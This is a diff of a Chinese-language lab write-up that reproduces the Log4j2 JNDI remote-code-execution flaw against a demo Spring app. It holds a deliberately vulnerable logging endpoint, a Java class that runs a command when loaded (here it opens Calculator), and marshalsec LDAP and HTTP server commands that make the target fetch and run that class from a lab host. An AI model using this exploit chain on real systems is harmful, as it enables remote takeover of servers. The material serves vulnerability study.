@@ -45,21 +45,20 @@ Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)
 
 #### 分析环境
 
-把demo.jar拉到jd-gui中反编译：
-
-- `com.example.log4j2_rce.Log4j2RceApplication`代码如下所示：
+把demo.jar拉到jd-gui中反编译代码如下所示：
 
 ```java
+// com.example.log4j2_rce.Log4j2RceApplication
 @PostMapping({"/hello"})
 public String hello(String payload) {
-        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
-        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
-        logger.error("{}", payload);
-        logger.info("{}", payload);
-        logger.info(payload);
-        logger.error(payload);
-        return "ok";
-        }
+  System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+  System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+  logger.error("{}", payload);
+  logger.info("{}", payload);
+  logger.info(payload);
+  logger.error(payload);
+  return "ok";
+}
 ```
 
 访问路由为hello，post`payload`参数；
@@ -76,23 +75,17 @@ $ java -jar demo.jar
   '  |____| .__|_| |_|_| |_\__, | / / / /
  =========|_|==============|___/=/_/_/_/
  :: Spring Boot ::        (v2.1.3.RELEASE)
- ···
 ```
 
 直接访问加上payload进行攻击：
 
-```bash
-# 启LDAP服务：
-$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.3.64/#dnslog"
-
-# 启http：
-$ cat dnslog.java
+```java
+// $ cat dnslog.java
 import java.lang.Runtime;
 import java.lang.Process;
 
 public class dnslog {
 	static {
-
 		try{
 	 	Runtime rt = Runtime.getRuntime();
 	 	String[] commands = {"open","/System/Applications/Calculator.app"};
@@ -101,10 +94,18 @@ public class dnslog {
 	 	}catch (Exception e) {
 	 	//no
 		}
-
 	}
 }
-$ javac dnslog.java
+// $ javac dnslog.java
+```
+
+```bash
+# 启LDAP服务：
+$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.3.64/#dnslog"
+```
+
+```bash
+# 启http：
 $ python3 -m http.server 80
 Serving HTTP on :: port 80 (http://[::]:80/) ...
 ```
